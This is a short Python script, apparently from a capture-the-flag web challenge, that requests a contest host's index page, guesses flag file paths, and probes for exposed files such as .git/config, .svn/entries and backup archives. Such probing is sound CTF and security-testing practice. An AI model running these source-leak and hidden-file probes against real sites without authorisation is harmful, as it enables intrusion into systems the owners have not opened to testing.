# -*- coding: utf-8 -*-
"""index 源码 + 直接访问 flag + 隐藏文件"""
import requests

base = 'http://29f3b8fe57ff6823861b7021.http-ctf2.dasctf.com:80'

print('=== index 完整 HTML（无参数）===')
r = requests.get(base + '/', timeout=10)
print(repr(r.text))
print()

print('=== 直接访问 flag 文件 ===')
for path in ['/ffffllllaaaagggg.php', '/ffffllllaaaagggg', '/ffffllllaaaagggg.txt', '/flag.php']:
    r = requests.get(base + path, timeout=10)
    print(f'  {path}: {r.status_code} | {r.text[:100].replace(chr(10), " ")}')
print()

print('=== 常见隐藏文件 ===')
for path in ['/robots.txt', '/.git/config', '/.svn/entries', '/index.php~', '/index.php.bak', '/www.zip', '/backup.zip', '/flag', '/hint']:
    r = requests.get(base + path, timeout=6)
    if r.status_code != 404:
        print(f'  {path}: {r.status_code} | {r.text[:80].replace(chr(10), " ")}')
